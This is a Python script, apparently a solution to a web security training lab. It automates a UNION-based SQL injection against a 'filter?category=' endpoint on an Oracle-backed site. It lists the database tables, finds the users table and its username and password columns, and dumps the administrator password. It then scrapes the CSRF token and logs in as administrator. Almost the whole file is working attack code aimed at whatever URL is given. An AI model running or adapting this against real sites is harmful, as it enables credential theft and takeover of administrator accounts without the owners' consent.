import requests
import argparse
import re
import sys
from urllib.parse import urlparse, quote
from bs4 import BeautifulSoup


class BaseExploit:
    def __init__(self, url):
        self.url = url

    def get_endpoint(self):
        endpoint = "filter?category=Lifestyle"
        url_parse = urlparse(self.url)
        return f"{url_parse.scheme}://{url_parse.netloc}/{endpoint}"

    def send_exploit(self, exploit):
        encoded_exploit = quote(exploit, safe=':/?=+')
        try:
            response = requests.get(encoded_exploit)
            response.raise_for_status()
            return response
        except requests.exceptions.RequestException as e:
            print(e)
            print(f"Connection error occurred\nCheck again if the host is up!!!")
            print("-"*50)
            print("Failed to exploit the target!!!")
            sys.exit(1)


class TableExtractor(BaseExploit):
    def extract_table_name(self, text):
        soup = BeautifulSoup(text, "html.parser")
        th_tags = [item.text.replace('\t', ' ')
                   for item in soup.find_all("th")]
        users_tables = next((
            tb_name for tb_name in th_tags if tb_name.startswith("USERS")), None)
        return users_tables

    def get_db_tables(self):
        payload = "' UNION SELECT table_name,NULL FROM all_tables--"
        exploit = f"{self.get_endpoint()}{payload}"
        response = self.send_exploit(exploit)
        if response:
            return self.extract_table_name(response.text)
        return None


class ColumnExtractor(TableExtractor):
    def extract_column_names(self, text):
        soup = BeautifulSoup(text, "html.parser")
        th_tags = [item.text.replace('\t', ' ')
                   for item in soup.find_all("th")]
        username = next((item for item in th_tags if 'USERNAME' in item), None)
        password = next((item for item in th_tags if 'PASSWORD' in item), None)
        return [username, password]

    def get_db_columns(self, table_name):
        payload = f"' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='{
            table_name}'--"
        exploit = f"{self.get_endpoint()}{payload}"
        response = self.send_exploit(exploit)
        if response:
            return self.extract_column_names(response.text)
        return None


class PasswordDumper(ColumnExtractor):
    def extract_admin_password(self, text):
        soup = BeautifulSoup(text, "html.parser")
        tr_tags = [item.text.replace('\t', ' ')
                   for item in soup.find_all("tr")]
        dump_passwd = next(
            (item for item in tr_tags if 'administrator' in item), '')
        self.password_match = re.search(r'\n([^\n]+)\n$', dump_passwd)
        if self.password_match:
            return self.password_match.group(1)
        return None

    def dump_password(self, table_name, columns_name):
        self.payload = f"' UNION SELECT {columns_name[0]},{
            columns_name[1]} FROM {table_name}--"
        exploit = f"{self.get_endpoint()}{self.payload}"
        response = self.send_exploit(exploit)
        if response:
            return self.extract_admin_password(response.text)
        return None


class AdminLogin(PasswordDumper):
    def get_login_page(self):
        url_parse = urlparse(self.url)
        return f"{url_parse.scheme}://{url_parse.netloc}/login"

    def login_as_admin(self, admin_pass):
        login_url = self.get_login_page()
        session = requests.Session()

        try:
            response = session.get(login_url)
            response.raise_for_status()
            page_content = response.text
        except requests.exceptions.RequestException as req_err:
            print(
                f"Request error occurred while fetching login page: {req_err}")
            return None

        try:
            bs = BeautifulSoup(page_content, "html.parser")
            csrf_token = bs.find("input", {"name": "csrf"}).get("value")
        except AttributeError as attr_err:
            print(f"Error extracting CSRF token: {attr_err}")
            return None

        data = {'csrf': csrf_token,
                'username': 'administrator', 'password': admin_pass}
        try:
            response = session.post(login_url, data=data)
            response.raise_for_status()
            return response
        except requests.exceptions.RequestException as req_err:
            print(f"Request error occurred while logging in: {req_err}")
            return None


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "url", help="the target's URL (eg: http://example.com)")
    args = parser.parse_args()
    input_url = args.url

    print("Exploiting target...")
    print("-" * 50)

    exploit = AdminLogin(input_url)
    table_name = exploit.get_db_tables()
    columns_name = exploit.get_db_columns(table_name)
    creds = exploit.dump_password(table_name, columns_name)
    response = exploit.login_as_admin(creds)

    print(f"Endpoint: {exploit.get_endpoint()}")
    print(f"Payload: {exploit.payload}")
    print(f"Admin Password: {exploit.password_match.group(1)}")
    print("-"*50)

    if not table_name:
        print("Failed to get the table name.")
        return

    if not columns_name:
        print("Failed to get the column names.")
        return

    if not creds:
        print("Failed to dump the password.")
        return

    if response and response.status_code == 200:
        print("Exploiting success!!!")
    else:
        print("Failed to exploit the target!!!")


if __name__ == "__main__":
    main()
